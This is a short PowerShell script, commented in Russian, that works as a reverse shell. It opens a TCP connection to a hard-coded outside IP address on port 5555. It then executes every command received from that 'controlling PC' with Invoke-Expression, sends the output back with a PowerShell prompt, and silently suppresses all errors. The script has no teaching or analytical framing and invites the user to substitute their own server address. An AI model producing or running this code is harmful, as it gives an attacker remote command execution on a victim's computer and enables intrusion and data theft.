try {
    # Адрес и порт управляющего ПК – замените на нужные вам значения
    $server = "5.199.233.23"
    $port = 5555

    # Создаем TCP-клиент и подключаемся к указанному серверу и порту
    $client = New-Object System.Net.Sockets.TCPClient($server, $port)
    $stream = $client.GetStream()
    
    # Буфер для данных
    [byte[]]$buffer = New-Object Byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        # Преобразуем полученные байты в строку (команду)
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        
        # Выполняем команду, перехватывая стандартный вывод и ошибки
        $output = Invoke-Expression $data 2>&1 | Out-String
        
        # Добавляем приглашение для удобства
        $response = $output + "PS " + (Get-Location).Path + "> "
        
        # Преобразуем ответ в байты и отправляем обратно управляющему ПК
        $responseBytes = ([System.Text.Encoding]::ASCII).GetBytes($response)
        $stream.Write($responseBytes, 0, $responseBytes.Length)
        $stream.Flush()
    }
    
    # Закрываем соединение
    $client.Close()
} catch {
    # Если возникает какая-либо ошибка, она будет подавлена
}
